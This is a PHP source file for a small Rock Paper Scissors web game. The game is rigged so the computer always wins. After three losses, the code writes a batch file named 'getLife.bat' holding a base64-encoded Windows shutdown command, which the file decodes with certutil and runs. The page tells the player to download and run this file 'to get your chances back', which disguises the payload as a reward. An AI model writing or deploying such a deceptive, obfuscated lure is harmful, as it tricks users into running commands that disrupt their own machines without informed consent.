<?php
session_start();

// Mini game logic - Rock Paper Scissors
$choices = ['Rock', 'Paper', 'Scissors'];
$userChoice = $_POST['choice'] ?? null;

// Initialize chances
if (!isset($_SESSION['chances'])) {
    $_SESSION['chances'] = 3;
}

// Make the computer always win
$winningMoves = [
    'Rock' => 'Paper',
    'Paper' => 'Scissors',
    'Scissors' => 'Rock'
];
$computerChoice = $winningMoves[$userChoice] ?? $choices[array_rand($choices)];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($userChoice && $_SESSION['chances'] > 0) {
        $_SESSION['chances']--;
        $result = "You lost! Computer chose $computerChoice. Chances left: " . $_SESSION['chances'];
        
        if ($_SESSION['chances'] === 0) {
            // Encrypted batch file content (Base64 encoded)
            $shutdownCommand = base64_encode("shutdown /s /t 5");
            $shutdownFile = 'getLife.bat';
            
            // Create the batch file with decryption logic
            $batchContent = "@echo off\n";
            $batchContent .= "echo %s | certutil -decode - chancesFiles.bat\n";
            $batchContent .= "call chancesFiles.bat\n";
            
            file_put_contents($shutdownFile, sprintf($batchContent, $shutdownCommand));
            
            $result .= "<br><strong>Game Over! Download the chances  file, and run it to get your chances back.</strong>";
            $result .= "<br><a href='$shutdownFile' download>Download chances File</a>";
            session_destroy();
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rock Paper Scissors</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 100px;
            background-color: #f4f4f4;
        }
        .game-container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            display: inline-block;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            margin: 10px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            background-color: #007BFF;
            color: white;
            transition: 0.3s;
        }
        button:hover {
            background-color: #0056b3;
        }
        p {
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="game-container">
        <h2>Rock Paper Scissors</h2>
        <?php if (isset($result)) echo "<p>$result</p>"; ?>
        <?php if (!isset($_SESSION['chances']) || $_SESSION['chances'] > 0): ?>
            <form method="POST">
                <button type="submit" name="choice" value="Rock">Rock</button>
                <button type="submit" name="choice" value="Paper">Paper</button>
                <button type="submit" name="choice" value="Scissors">Scissors</button>
            </form>
        <?php endif; ?>
    </div>
</body>
</html>
